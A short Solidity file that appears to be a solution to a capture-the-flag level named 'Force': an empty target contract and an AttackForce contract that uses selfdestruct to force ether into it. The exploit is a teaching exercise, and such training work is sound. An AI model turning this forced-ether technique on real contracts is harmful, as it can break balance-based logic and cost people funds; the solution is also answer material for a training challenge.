
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract AttackForce {
    address private beneficiary;

    constructor(address _beneficiary) {
        beneficiary = _beneficiary;
    }

    function destroy() public {
        selfdestruct(payable(beneficiary));
    }

    receive() external payable {
    }
}

